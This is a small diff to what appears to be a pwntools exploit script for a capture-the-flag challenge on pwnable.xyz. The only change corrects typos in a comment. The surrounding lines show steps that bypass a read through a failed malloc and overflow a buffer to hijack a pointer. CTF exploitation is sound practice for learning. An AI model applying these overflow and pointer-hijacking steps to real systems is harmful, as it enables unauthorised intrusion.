@@ -21,7 +21,7 @@ r = remote('svc.pwnable.xyz',30036)
 ###Strange logic, bypass read to NULL with failed malloc
 save('M30W',first=True)
 
-###Logic bug agaim, cantinuously concat payload to bof and hijack buf ptr
+###Logic bug again, continuously concat payload to bof and hijack buf ptr
 handle_fill(3,0)
 handle_fill(4,0)
 handle_fill(4,0)
